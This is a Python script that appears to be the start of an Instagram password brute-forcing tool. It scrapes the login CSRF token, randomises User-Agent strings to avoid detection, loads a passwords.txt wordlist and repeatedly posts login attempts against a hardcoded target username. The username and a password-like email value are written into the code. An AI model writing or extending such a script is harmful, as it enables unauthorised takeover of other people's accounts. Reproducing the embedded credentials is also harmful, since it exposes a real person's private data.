import requests
import time
import sys
from datetime import datetime
from colorama import init, Fore
import random

# Initialize colorama
init(autoreset=True)

# Set up regular HTTP request (no proxy)
def setup_session():
    session = requests.Session()
    session.headers.update({
        'User-Agent': generate_user_agent()
    })
    return session

# Generate random User-Agent
def generate_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
    ]
    return random.choice(user_agents)

# Instagram login function with CSRF token handling
def instagram_login(username, password, session):
    login_url = 'https://www.instagram.com/accounts/login/ajax/'

    # Fetch CSRF token by sending a GET request
    response = session.get('https://www.instagram.com/accounts/login/')
    print(Fore.YELLOW + f"[INFO] Response from GET login page: {response.status_code}")
    
    if response.status_code != 200:
        print(Fore.RED + "[-] Failed to load login page.")
        return False

    csrf_token = response.cookies.get('csrftoken')

    if not csrf_token:
        print(Fore.RED + "[-] Could not retrieve CSRF token.")
        return False

    # Prepare login payload
    timestamp = int(datetime.now().timestamp())
    payload = {
        'username': username,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}',
        'queryParams': {},
        'optIntoOneTap': 'false'
    }

    headers = {
        'User-Agent': generate_user_agent(),
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': 'https://www.instagram.com/accounts/login/',
        'x-csrftoken': csrf_token
    }

    # Send POST request for login
    try:
        login_response = session.post(login_url, data=payload, headers=headers)
        print(Fore.YELLOW + f"[INFO] Login response: {login_response.status_code}")
        login_response.raise_for_status()  # Raise error for invalid response

        response_data = login_response.json()
        print(Fore.YELLOW + f"[INFO] Login response data: {response_data}")

        if response_data.get('authenticated', False):
            return True
        else:
            print(Fore.RED + "[-] Login failed. Response: " + str(response_data))
            return False
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"[-] Request error: {e}")
        return False

# Test function with different delay and concurrency configurations
def test_speed(username, password, delay, max_workers):
    print(Fore.GREEN + f"\n[*] Testing with delay = {delay} seconds and max_workers = {max_workers}")

    session = setup_session()

    def try_password(password):
        print(Fore.YELLOW + f"[+] Trying: {password}", end=" | ", flush=True)
        if instagram_login(username, password, session):
            print(Fore.GREEN + f"[+] Login successful for {username}:{password}")
            return True
        else:
            print(Fore.RED + "Status = [Fail]")
            return False

    # Only 1 password per test to make debugging easier
    try_password(password)

    time.sleep(delay)

# Main function to test multiple configurations
def main():
    username = "meet____z"
    password = "meetzalavadiya7600948307@instagram.com"
    password_file = "passwords.txt"

    try:
        with open(password_file, "r") as f:
            passwords = f.read().splitlines()
    except FileNotFoundError:
        print(Fore.RED + f"[-] Error: {password_file} not found.")
        sys.exit(1)

    print(Fore.GREEN + f"[*] Loaded {len(passwords)} passwords from {password_file}")

    # Test minimal delay and workers
    delays = [1]  # Start with the minimal delay of 1 second
    max_workers_list = [1]  # Start with 1 worker at a time

    for delay in delays:
        for max_workers in max_workers_list:
            test_speed(username, password, delay, max_workers)

if __name__ == "__main__":
    main()
    
    
